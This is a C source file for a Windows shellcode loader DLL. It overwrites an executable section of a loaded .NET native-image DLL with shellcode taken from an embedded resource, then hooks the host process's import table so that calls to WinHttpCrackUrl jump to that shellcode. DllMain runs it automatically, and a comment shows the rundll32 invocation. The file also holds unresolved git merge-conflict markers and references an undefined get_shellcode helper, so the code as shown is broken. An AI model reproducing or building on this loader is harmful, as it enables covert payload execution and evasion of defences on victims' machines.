#include <windows.h>
#include <stdio.h>
#include <dbghelp.h>

#include "resource.h"

#pragma comment(lib, "Dbghelp.lib")


EXTERN_C PVOID sjump(IN PVOID shellcode_address);

BOOL go(HINSTANCE hinstDll) {

<<<<<<< HEAD
    HMODULE hmod = LoadLibraryA("System.Xml.ni.dll");
=======

void hook_iat(HMODULE hMod) {

    LPVOID imageBase = GetModuleHandleA(NULL);


}

int main(int argc, char ** argv) {

    HMODULE hmod = LoadLibraryA("System.Private.CoreLib.dll");
>>>>>>> 014a06d99de53fa46a3ac11eb4c13a538111af76

    if (hmod == NULL) {
        // printf("Failed to load library\n");
        return FALSE;
    }

    IMAGE_DOS_HEADER* dos_header = (IMAGE_DOS_HEADER*)hmod;
    IMAGE_NT_HEADERS* nt_headers = (IMAGE_NT_HEADERS*)((BYTE*)dos_header + dos_header->e_lfanew);
    IMAGE_SECTION_HEADER* section_header = IMAGE_FIRST_SECTION(nt_headers);

    // Look for section with RWX ("/4" in msys-2.0.dll)
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        if (strcmp(section_header[i].Name, ".xdata") == 0) {

            //printf("SectionName->%s\n", section_header[i].Name);
            //printf("VirtualAddress->0x%p\n", hmod + section_header[i].VirtualAddress);
            //printf("SizeOfRawData->%d\n", section_header[i].SizeOfRawData);

            // Calculate section base with VirtualAddress RVA + HMODULE
            BYTE* section_base = (((BYTE*)hmod + section_header[i].VirtualAddress));

            // Load shellcode from resource to memory
            PSHELLCODE shellcode = NULL;
            shellcode = get_shellcode(hinstDll);

            //printf("Shellcode->Size->%lli\n", shellcode->size);

            // Ensure that the shellcode isn't larger than the RWX section
            if (shellcode->size > section_header[i].SizeOfRawData) {
                // printf("Size of payload larger than section size.\n");
                return FALSE;
            }

            // Overwrite section base with the shellcode
            for (int i = 0; i < shellcode->size; i++) {
                section_base[i] = shellcode->buf[i];
            }

<<<<<<< HEAD
            // Get a pointer to the exe that loaded us
            LPVOID image_base = GetModuleHandleA(NULL);

            // Get a pointer to the current process' import table
            ULONG size;
            PIMAGE_IMPORT_DESCRIPTOR import_table = (PIMAGE_IMPORT_DESCRIPTOR)ImageDirectoryEntryToDataEx(
                image_base,
                TRUE,
                IMAGE_DIRECTORY_ENTRY_IMPORT,
                &size,
                NULL
            );

            // Iterate through imports
            DWORD i;
            for (i = 0; i < size; i++) {

                char* import_name = (char*)((PBYTE)image_base + import_table[i].Name);

                // Look for target DLL
                if (_stricmp(import_name, "Winhttp.dll") == 0) {

                    // Get a pointer to the DLL
                    HMODULE win_http = GetModuleHandleA("winhttp.dll");

                    if (win_http == NULL) return FALSE;

                    // Get a pointer to the target function that we will hook
                    PROC target_function = (PROC)GetProcAddress(win_http, "WinHttpCrackUrl");

                    if (target_function == NULL) return FALSE;

                    // Get the first thunk
                    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)image_base + import_table[i].FirstThunk);
                    
                    // Iterate over functions 
                    while (thunk->u1.Function) {

                        // Check if the function address matches our target
                        PROC* current_function_address = (PROC*)&thunk->u1.Function;
                        if (*current_function_address == target_function) {

                            // Set memory region to be writable
                            DWORD old_protect = 0;
                            VirtualProtect((LPVOID)current_function_address, 4096, PAGE_READWRITE, &old_protect);

                            // Overwrite IAT entry with pointer to RWX section of packed DLL
                            *current_function_address = (PROC)section_base;

                            // Reset memory region to old protection constant
                            VirtualProtect((LPVOID)current_function_address, 4096, old_protect, &old_protect);

                            return TRUE;
                        }
                        thunk++;
                    }
                }
            }
=======
            // Jump to the section
            // ((void (*)(void))sectionBase)();
            // sjump(sectionBase);
>>>>>>> 014a06d99de53fa46a3ac11eb4c13a538111af76
        }
    }
    return FALSE;
}

#ifdef _WINDLL

extern __declspec(dllexport) void StartW(HINSTANCE hinstDLL) {

    // rundll32.exe loader.dll,StartW
    while (TRUE) {
        Sleep(1000 * 5);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    //FILE* s_stdout;
    //FILE* s_stderr;

    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:

        //AllocConsole();

        // freopen_s(&s_stdout, "CONOUT$", "w", stdout);
        // freopen_s(&s_stderr, "CONOUT$", "w", stderr);

        go(hinstDLL);

        break;

    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        // FreeConsole();
        break;
    }
    return TRUE;
}

#else
int main(int argc, char ** argv) {
    go(NULL);
}
#endif
